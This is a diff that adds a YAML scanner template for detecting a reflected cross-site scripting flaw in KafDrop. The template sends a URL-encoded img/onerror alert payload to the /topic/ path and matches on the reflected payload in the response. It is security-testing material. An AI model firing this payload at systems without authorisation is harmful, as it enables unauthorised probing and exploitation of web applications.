@@ -1,0 +1,22 @@
+id: kafdrop-xss
+info:
+  name: KafDrop XSS
+  risk: High
+
+params:
+  - root: "{{.BaseURL}}"
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 500 && StringSearch("response", "Kafdrop") && StringSearch("response", "<img src=x onerror=alert(2)>")
+
+references:
+  - author: j3ssie
+  - repo: https://github.com/obsidiandynamics/kafdrop
